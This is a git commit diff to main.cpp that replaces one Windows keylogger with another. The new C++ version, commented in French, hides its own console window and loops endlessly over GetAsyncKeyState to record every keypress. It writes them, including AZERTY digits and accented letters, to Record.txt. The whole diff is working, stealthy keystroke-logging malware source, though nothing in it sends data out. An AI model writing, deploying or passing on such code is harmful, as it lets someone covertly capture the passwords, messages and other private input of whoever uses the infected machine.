6d6e69e7e6f40336c9cb001c8c29229bfd851e7c
can-er <47574594+can-er@users.noreply.github.com>
2019-11-21 12:39:43 +0100

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -1,47 +1,257 @@
 #include <iostream>
-#include <Windows.h>
+#include <windows.h>
+#include <Winuser.h>
+#include <fstream>
 
 using namespace std;
 
-int Save(int _key, char *file);
+void hide ()
+{
+     HWND stealth; // Une fenêtre Windows est toujours identifiée par un "Window handle" (HWND). On instancie ici un objet HWND pour pouvoir ensuite récupérer le handle de la fenêtre qu'on veut cacher.
+     AllocConsole(); // Alloue une nouvelle console au processus en cours. Un processus ne peut avoir qu'une console allouée. Si l'opération échoue, la valeur retournée vaut 0.
+     stealth = FindWindowA("ConsoleWindowClass", NULL); // Récupère le "handle" de la fenêtre passée en paramètre. 
+     ShowWindow(stealth, 0); // cache la fenêtre en cours et en attribue une autre
+}
+void log ()
+{
+     char key;
 
-int main() {
- 	
- 	FreeConsole();
-	char i;
+     for (;;)  // boucle infinie
+     {    
+          Sleep(25); // afin de ne pas utiliser toutes les ressources du CPU. Omettre cette ligne peut causer au ralentissement du système d'exploitation
 
-	while (true) 
-	{
- 		Sleep(100);
- 		for (i = 8; i <= 255; i++) {
- 			if (GetAsyncKeyState(i) == -32767) {
-				Save(i, "log.txt");
- 			}
- 		}
- 	}
- 	return 0;
+          for(key=8; key <= 222; key++) // nous-nous intéressons à la table ASCII et plus précisément aux valeurs allant de 8 à 222
+          {
+               if (GetAsyncKeyState(key) == -32767) // GetAsyncKeyState() est une routine d'interruption système qui surveille l'appui sur une touche au clavier
+               {
+                    ofstream write ("Record.txt", ios::app); // ios::app: mode d'ouverture 'app' (append). Ajout des éléments en fin de fichier 
+                    
+
+                    if ((key>64) && (key<91) && !(GetAsyncKeyState(0x10))) // 0x10 est la valeur hexadecimale de la touche [Shift]
+                         
+                    {
+                         /* 
+                         si la touche appuyée se situe entre 64 (A) et 90 
+                         (Z) dans la table ASCII mais que Shift n'est pas 
+                         appuyé, on  incrémente key de 32 pour sauvegarder 
+                         une lettre minuscule. On ferme ensuite le fichier
+                         */
+
+                         key += 32;
+                         write << key;
+                         write.close();
+                         break;
+                    }
+
+
+                    else if ((key > 64) && (key < 91))
+                    {
+                         /*
+                         si la touche appuyée se situe entre 64 (A) et 90
+                         (Z) dans la table ASCII mais que Shift est appuyé, 
+                         on écrit la valeur  "immédiate" de key dans le fichier. 
+                         On n'oublie pas de le fermer.
+                         */
+                         
+                         write << key;
+                         write.close();
+                         break;
+                    }
+
+
+                    else
+                    {
+                         switch(key) // Ce switch traîte les caractères numériques/spéciaux du clavier. 
+                         {    
+                              case 58:
+                              {
+                                   if(GetAsyncKeyState(0x10)) 
+                                   {
+                                        write << "0";
+                                   }
+
+                                   else
+                                   {
+                                        write << "à";
+                                   }
+                              }
+                              break;
+
+                              case 57:
+                              {
+                                   if(GetAsyncKeyState(0x10))
+                                   {
+                                        write << "9";
+                                   }
+
+                                   else
+                                   {
+                                        write << "ç";
+                                   }
+                              }
+                              break;
+                            
+                              case 56:
+                              {
+                                   if( GetAsyncKeyState(0x10))
+                                   {
+                                        write << "8";
+                                   }
+
+                                   else
+                                   {
+                                        write << "!";
+                                   }
+                              }
+                              break;
+                            
+                              case 55:
+                              {
+                                   if( GetAsyncKeyState(0x10))
+                                   {
+                                        write << "7";
+                                   }
+
+                                   else
+                                   {
+                                        write << "è";
+                                   }
+                              }
+                              break;
+                            
+                              case 54:
+                              {
+                                   if( GetAsyncKeyState(0x10))
+                                   {
+                                        write << "6";
+                                   }
+
+                                   else
+                                   {
+                                        write << "§";
+                                   }
+                              }
+                              break;
+
+                              case 53:
+                              {
+                                   if( GetAsyncKeyState(0x10))
+                                   {
+                                        write << "5";
+                                   }
+
+                                   else
+                                   {
+                                        write << "(";
+                                   }
+                              }
+                              break;
+
+                              case 52:
+                              {
+                                   if( GetAsyncKeyState(0x10))
+                                   {
+                                        write << "4";
+                                   }
+
+                                   else
+                                   {
+                                        write << "'";
+                                   }
+                              }
+                              break;
+                            
+                              case 51:
+                              {
+                                   if( GetAsyncKeyState(0x10))
+                                   {
+                                        write << '3';
+                                   }
+
+                                   else
+                                   {
+                                        write << '"';
+                                   }
+                              }
+                              break;
+                            
+                              case 50:
+                              {
+                                   if( GetAsyncKeyState(0x10))
+                                   {
+                                        write << "2";
+                                   }
+
+                                   else
+                                   {
+                                        write << "é";
+                                   }
+                              }
+                              break;
+
+                              case 49:
+                              {
+                                   if( GetAsyncKeyState(0x10))
+                                   {
+                                        write << "1";
+                                   }
+
+                                   else
+                                   {
+                                        write << "&";
+                                   }
+                              }
+                              break;
+
+                              case VK_SPACE:
+                              {
+                                   write << " ";
+                              }
+                              break;
+
+                              case VK_RETURN:
+                              {
+                                   write << " \n";
+                              }
+                              break;
+
+                              case VK_TAB:
+                              {
+                                   write << "     ";
+                              }
+                              break;
+
+                              case VK_BACK:
+                              {
+                                   write << "<BackSpace>";
+                              }
+                              break;
+
+                              case VK_ESCAPE:
+                              {
+                                   write << "<Esc>";
+                              }
+                              break;
+
+                              case VK_DELETE:
+                              {
+                                   write << "<Delete>";
+                              }
+                              break;
+
+                              default:
+                                   write << key;
+                         }
+                    }
+               }              
+          }
+     }
+
 }
 
-
-int Save(int _key, char *file) {
-
-	cout << _key << endl;
-	Sleep(100);
-	FILE *OUTPUT_FILE;
-	OUTPUT_FILE = fopen(file, "a+");
-
-	if (_key == VK_LSHIFT)
-		fprintf(OUTPUT_FILE, "%s", "MAJ+ ");
-	else if (_key == VK_RETURN)
-		fprintf(OUTPUT_FILE, "%s", "\n");
-	else if (_key == VK_ESCAPE)
-		fprintf(OUTPUT_FILE, "%s", "[ESC]");
-	else if (_key == VK_SPACE)
-		fprintf(OUTPUT_FILE, "%s", " ");
-	else
-		fprintf(OUTPUT_FILE, "%s", &_key);
-
-	fclose(OUTPUT_FILE);
-
-	return 0;
+int main()
+{
+     hide();
+     log();     
+     return 0;
 }
